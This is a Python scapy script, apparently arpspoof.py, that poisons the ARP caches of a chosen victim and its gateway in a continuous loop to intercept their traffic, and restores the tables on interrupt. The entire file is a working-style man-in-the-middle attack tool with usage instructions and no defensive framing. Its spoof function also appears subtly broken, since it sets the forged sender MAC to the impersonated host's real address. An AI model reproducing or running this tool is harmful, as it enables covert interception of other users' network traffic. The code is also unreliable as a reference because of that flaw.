from scapy.layers.l2 import Ether,ARP,srp, sendp
from scapy.all import send, get_if_hwaddr
import sys

# broadcast_mac = Ether(dst="ff:ff:ff:ff:ff:ff")
# arp_ip = ARP(pdst="192.168.64.3")
# # arp_ip  = ARP(pdst="10.0.0.1")
# print("Preparing to send")
# answered, unanswered = srp(broadcast_mac/arp_ip)
# print("Sent ARP successfully")
# if answered:
#     for sent, received in answered:
#         print(f"IP: {sent.psrc} and MAC: {sent.hwsrc}")
#         print(f"IP: {received.psrc} and MAC: {received.hwsrc}")
# else:
#     print("No answer")


EXPECTED_ARGUMENT_COUNT = 3

def get_mac(ip):
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_ip = ARP(pdst=ip)
    answered, _ = srp(broadcast/arp_ip, timeout=1, verbose=0)
    if not answered:
        raise Exception(f"IP {ip} does not exists!")
    # answered[0] -> first found (sent, received) pair, and answered[0][1] is the received (who responded)
    mac = answered[0][1].hwsrc
    return mac

def spoof(victim_ip, spoof_ip):
    try:
        victim_mac = get_mac(victim_ip)
    except Exception as e:
        print(f"Exception while get mac for {victim_ip}: {e}")
        return
    attacker_mac = get_mac(spoof_ip)
    packet = ARP(op=2, hwdst=victim_mac, pdst=victim_ip, psrc=spoof_ip, hwsrc=attacker_mac)
    send(packet, iface="eth0", verbose=False)
    print(f"[+] Spoofed {victim_ip} pretending as {spoof_ip}")

def restore(victim_ip, spoof_ip):
    victim_mac = get_mac(victim_ip)
    spoof_mac = get_mac(spoof_ip)
    packet = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=spoof_ip, hwsrc=spoof_mac)
    send(packet, iface="eth0", verbose=False)
    print(f"[+] Restoring {victim_ip}...")

def run(victim_ip, gateway_ip):
    victim_mac = get_mac(victim_ip)
    gateway_mac = get_mac(gateway_ip)

    print(f"MAC address for {victim_ip}: {victim_mac}")
    print(f"MAC address for {gateway_ip}: {gateway_mac}")

    while True:
        try:
            spoof(victim_ip, gateway_ip)
            spoof(gateway_ip, victim_ip)
            print("********************************")
        except KeyboardInterrupt:
            print("Cancelling")
            restore(gateway_ip, victim_ip)
            restore(victim_ip, gateway_ip)
            break


def main():
    # Check if the total number of arguments (length of sys.argv) is 3
    if len(sys.argv) != EXPECTED_ARGUMENT_COUNT:
        print("Usage: sudo python3 arpspoof.py <Target IP> <Gateway IP>")
        print(f"Error: Expected {EXPECTED_ARGUMENT_COUNT - 1} arguments, but received {len(sys.argv) - 1}.")
        sys.exit(1) # Exit with an error code

    victim_ip = sys.argv[1]
    gateway_ip = sys.argv[2]
    run(victim_ip, gateway_ip)

if __name__ == "__main__":
    main()
